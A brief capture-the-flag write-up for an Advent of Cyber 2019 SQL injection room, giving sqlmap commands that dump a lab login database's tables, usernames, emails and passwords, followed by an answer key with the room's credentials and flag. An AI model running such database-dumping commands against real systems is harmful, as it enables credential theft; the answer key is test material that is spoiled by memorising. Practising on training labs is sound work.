# Advent of Cyber 01 - 2019
# Day 23
# LapLANd (SQL Injection)


> Machine IP : `10.10.40.83`

> Intercept the login page and save the request as `login.txt`
> sqlmap command 
```
sqlmap -r login.txt --dbs --dump 
```
> to view the tables in database 
```
sqlmap -r login --dump -D social --tables 
```
> to view content of users table 
```
sqlmap -r login --dump -D social -T users

```
> to see the collumn values :
```
sqlmap -r login --dump -D social -T users -C id,username,email,password
```

| Que$t1on$ | An$wer$ |
|-----------|---------|
| Which field is SQL injectible? Use the input name used in the HTML code. | log_email |
| What is Santa Claus' email address? | bigman@shefesh.com |
| What is Santa Claus' plaintext password ? | saltnpepper |
| Santa has a secret! Which station is he meeting Mrs. Mistletoe in? | waterloo |
| Once you're logged in to LapLANd, there's a way you can gain a shell on the machine! Find a way to do so and read the file in /home/user/ | THM{SHELLS_IN_MY_EGGNOG} |
